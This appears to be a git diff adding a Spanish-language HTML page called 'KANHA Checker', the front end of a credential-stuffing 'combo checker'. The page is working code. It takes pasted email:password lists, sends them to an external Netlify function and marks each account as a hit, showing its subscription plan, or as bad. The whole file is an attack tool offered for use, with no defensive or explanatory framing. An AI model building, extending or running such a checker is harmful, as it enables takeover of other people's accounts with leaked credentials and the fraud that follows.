@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KANHA Checker</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
+        textarea { width: 90%; max-width: 600px; height: 150px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; font-family: monospace; }
+        button { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 15px; }
+        #result { background: #111; padding: 15px; margin-top: 20px; text-align: left; white-space: pre-wrap; border: 1px solid #333; }
+        .hit { color: #0f0; } .bad { color: #f00; }
+    </style>
+</head>
+<body>
+    <h1>[ KANHA CHECKER ]</h1>
+    <textarea id="combos" placeholder="prueba@gmail.com:contraseña"></textarea><br>
+    <button onclick="startCheck()">INICIAR CHEQUEO</button>
+    <div id="result">Esperando combos...</div>
+    <script>
+        async function startCheck() {
+            const combos = document.getElementById('combos').value.trim();
+            const resultDiv = document.getElementById('result');
+            if (!combos) return resultDiv.innerHTML = "<span class='bad'>Poné algo.</span>";
+            resultDiv.innerHTML = "Chequeando...";
+            try {
+                const res = await fetch("https://unrivaled-dodol-d78095.netlify.app/.netlify/functions/check", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ combos: combos.split('\n') })
+                });
+                const data = await res.json();
+                let html = "";
+                data.results.forEach(r => {
+                    html += r.valid ? `<span class="hit">[HIT] ${r.email} | ${r.plan}</span>\n` : `<span class="bad">[BAD] ${r.email} | ${r.reason}</span>\n`;
+                });
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class='bad'>Error: ${e.message}</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
